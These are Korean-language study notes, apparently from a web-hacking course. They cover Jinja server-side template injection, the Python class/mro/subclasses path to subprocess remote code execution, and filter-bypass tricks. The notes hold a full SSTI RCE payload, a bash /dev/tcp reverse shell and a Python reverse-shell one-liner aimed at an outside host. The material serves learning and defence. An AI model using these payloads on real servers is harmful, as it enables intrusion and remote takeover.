# 7. SSTI

## SSTI란?

- SSTI : Server Side Template Injection
    - 서버 측에 template을 넣는 것
- Template : 서버에서 front-end로 제공하기 위해서 사용
    - 우리가 공부했던 jinja 같은 것들

### Attack 관점

- Server-side attack, Client-side attack 둘 다 가능
    - XSS와 연계될 가능성도 있어서 Client-side attack도 가능하다.
        - 문제 Store_Your_Jinja같은 것들
    - 이번에 더 심도 있게 볼 것은 Server-side attack이다.
- Server-side : Server의 변수들을 반영할 수 있다는 특징을 가진다.
    - Server의 변수가 왜 중요하냐?
        - 프로그램 구조(언어의 구조)에 따라 변수로부터 다양한 행동이 가능하다.
        - Server의 값을 가져올 수 있다. (비밀 키, 중요 정보 등등)

## 공격 방법

- recap : 아래는 XSS에서 jinja에 대해 언급했던 내용과 중복,
    - Server-Side-Rendering(SSR)
        - 동적인 페이지를 주지만, user에서 처리하는 것이 아니라 server에서 처리하는 것이다.
        - 대체로 template들이 SSR에 해당
    - {{ }}와 {%  %}를 활용하여 template을 생성
        - variable bracket, block bracket
        - (official한 표현은 아니지만, )출력 bracket과 비출력 bracket
        - 참고로 {# #}은 comment에 사용
    - {{ 4+2 }} < python으로 취급되어 6이 출력
    - {{ text }} < 변수로 취급
        - render_template(”index.html”, text=”string”)
        - 위와 같이 변수를 전달해주어야 함.
    - js 파일 import
        - `<script src="{{ url_for('static', filename='index.js')}}"></script>`
        - static 폴더의 index.js를 가져오겠다는 의미
    - {% %}는 if문, for문 등을 사용할 때 활용
        - if, endif를 통해 해당 if state에 만족하면 안에 있는 block의 값을 출력
        - for도 비슷한 결과
    - jinja에서 사용할 수 있는 변수는
        1. render_template에서 넘겨준 변수
        2. 기본적으로 사용 가능하게 해주는 전역 변수
            - request, config, session 등
    - {{ request }} 전역변수라서 사용 가능
    - {{ 4 }} 상수라서 가능
    - {{ text }} render_template에서 전달해줘야 풀 수 있다.

### python의 구조

- 변수에서 대체 어떻게 exploit까지 이어지도록 할 수 있는가?
1. python은 객체지향 언어다.
    - Class를 통해 객체를 만들고, 이들을 관리할 수 있는 기능이 있는 객체지향 언어
    - 이러한 객체를 상속을 사용하여 기능을 그대로 가져올 수 있으며, 코드의 재사용성을 높임
2. Class는 항상 object를 상속함
    - object는 모든 class의 부모
3. Object의 subclasses를 통해 하위 Class에 접근 가능
    - 상속을 한 subclasses를 볼 수 있는 기능이 있다.
    - object를 모든 class가 상속한다. → object의 subclass에는 모든 class가 존재한다.
4. 변수 -> object -> subclasses -> 원하는 함수로 접근
    - class 중에 우리가 원하는 함수를 가지고 있는 class가 있을 것

### Exploit path

- Variable -> class -> mro -> subclass -> subprocess.popen -> rce
1. jinja는 variable로 사용할 수 있다 → Variable부터 시작(literal constant도 가능)
2. variable의 class를 가져올 수 있다. <variable name>.__class__ 형태로 가져온다.
3. class에는 __mro__가 존재한다.
    - mro는 자신이 상속하고 있는 class를 나열한다. 이게 필요한 이유는,
        - 다중 상속을 받을 때, 부모 클래스에 동일한 이름의 메소드를 호출하는 경우가 생길 수 있다.
        - 이때 어떤 부모의 메소드를 호출해야 할 지 모르기 때문에 발생하는 문제를 mro의 순서로 해결
4. mro에는 모든 부모가 listing되어 있다 → object class를 가져올 수 있다.
5. object에서 subclasses를 찾을 수 있다.
    - 함수 형태라서 ()로 호출해주면 모든 목록이 뜨게 된다.
6. subprocess class를 찾는다. (이번 exploit에서 시도하는 것)
7. popen을 통해 shell을 invoke하여 rce(Remote Command Execution)
8. 이후에 reverse shell을 열어서 하든, 다른 것을 하든 할 수 있다.

- 종합 :
    
    ```bash
    request.__class__.__mro__[1].__subclasses__()[219]("id", shell=True, stdout=-1).communicate()
    ```
    
    - script resource를 통해 실습
- bypass technique :
    1. .
        - |attr(“__mro_\x5f”)
        - .(dot)가 필터링되는 경우, |를 활용한 filter로 우회할 수 있다.
        - filter란?
            - jinja에서 제공하는 기능으로, jinja template에서 표현하는 방식을 유연하게 표현할 수 있도록 도와주는 도구로, 다양한 기능들이 존재한다.
            - |attr의 경우 .처럼 그 속성을 불러와서 사용할 수 있다.
            - 이때 소괄호에 따옴표로 값을 넣어주므로, _, g 등 필터링되는 값들을 \x 인코딩으로 우회할수도 있다.
            - 참고로, | e filter는 html entity를 escape해주어 xss를 막는 데 도움을 준다.
                - <>‘ “ 등을 인코딩한다.
            - https://jinja.palletsprojects.com/en/stable/templates/#builtin-filters
                - 이 링크에서 filter들을 볼 수 있다.
    2. []
        - .get(number)
        - 대괄호가 인코딩되는 경우 get을 활용해서 가져올 수 있다.
            - 이는 python에서 제공하는 기능으로, 일반 python에서도 사용 가능하다.
            - 여기도 .을 사용하기에, .이 필터링되는 경우 |attr로 우회해야 한다.
    3. __, \x5f
        - |attr(“get”)(request.args.a) … &a=__mro__
        - 문자열 안에 있는 값들을 전부 필터링해버리는 경우, 인코딩까지 필터링하는 경우 사용 가능하다.
        - request는 항상 접근 가능하므로, request에 임의의 argument(parameter)를 넣어서 우회 가능하다.
        - 문자열의 위치에 request.args.varaible_name을 넣고
        - &variable_name=content 형식으로 우회가 가능하다.

## Reverse Shell

### Shell

ssh처럼 interactive하게 외부의 shell을 연결하는 것

원격 조종을 당하는 컴퓨터에 직접 접속해서 원격 조종을 하는 것

### Inbound, Outbound 정책

- 대부분의 firewall(방화벽) 정책은 inbound를 제한하고 outbound는 풀어주는 경우가 많다.
    - inbound : 외부에서 내부에 접속하는 것
        - 예) 서버를 열어서 그 서버에 접속하도록 하는 것
    - outbound : 내부에서 외부에 접속하는 것
        - 예) 웹사이트를 들어가거나, 크롤링, apt-get 등으로 패키지 설치하기 등
- inbound port는 80, 443 등 http와 https, 아니면 ssh 23번 포트 등만 열어두고 잠그는 경우가 많다.
    - 이 port들은 대부분 이미 사용중이라서 shell 연결하는 통로로 열기 어렵다.
    - 예) netcat을 사용해서 port 접속을 하게 하려는 경우, nc -lvp 8080 등을 했지만 inbound port에 막혀서 접속 못하는 문제
- outbound port는 전부 열어두는 경우가 많다.
    - 웹 접속이나, 패키지 설치 등을 하려면 안에서 포트를 열어야 하는데, 1024 이후의 대부분의 포트를 프로세스가 임의로 얻어서 값을 받아오기 때문

### Reverse Shell

ssh처럼 interactive하게 외부의 shell을 연결하는 것

원격 조종을 당하는 컴퓨터에서 원격 조종을 하는 컴퓨터에 접속해서 원격 조종을 하는 것

- 즉, outbound port를 통해 빠져나가서 shell을 연결하는 것이 reverse shell이다.
- 아래와 비슷한 형식으로 사용한다.
    
    ```bash
    [/](http://localhost/cgi-bin/myprog.cgi)bin/bash -i > /dev/tcp/localhost/9090 0<&1 2>&1
    ```
    
- /bin/bash
    - shell을 연다.
- -i
    - interactive하게 열겠다는 option
- >
    - 이후 파일로 출력을 연결을 함
- /dev/tcp/localhost/9090
    - localhost에 9090번 포트로 연결을 한다.
    - 다른 곳으로도 연결시킬 수 있다.
- 0<&1
    - 표준입력(stdin) 0을 표준 출력(stdout) &1에서 받아옴
- 2>&1
    - 표준오류(stderr) 2를 표준 출력(stdout) &1과 같게 설정

### 참고 : 0, 1, 2가 왜 표준 I/O Error를 나타내는가?

- 파일 디스크립터(File Descriptor) : 리눅스에서 프로세스(process)가 파일(file)을 다룰 때 사용
- 프로세스에서 특정 파일에 접근할 때 사용하는 정수값
- 일반적으로 0이 아닌 정수임

- 리눅스 관점에서, 모든 것을 파일으로 본다.
    - 일반적인 파일
    - 디렉토리
    - 소켓
    - 파이프
    - 등등 모든 객체들을 파일로 관리함
- 이 파일들을 접근할 때 파일 디스크립터를 이용
    1. **프로세스가 실행 중에 파일을 Open**
    2. **커널은 해당 프로세스의 파일 디스크립터 숫자 중 사용하지 않는 가장 작은 값을 할당**
    3. **프로세스가 열려있는 파일에 시스템 콜을 이용해서 접근할 때** 
    4. **파일 디스크립터(FD)값을 이용해서 파일을 지칭할 수 있다**
- 프로그램이 프로세스로 메모리에서 실행될 때, 기본적으로 할당되는 파일디스크립터가 바로
    - 0 = 표준입력(Standard Input),
    - 1 = 표준 출력(Standard Output),
    - 2 = 표준에러(Standard Error)이다.
- python을 활용한 reverse shell
    
    ```python
    export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    ```
    
    - 여기도 보면 file descriptor로 fd를 0, 1, 2를 연결하는 것을 볼 수 있다.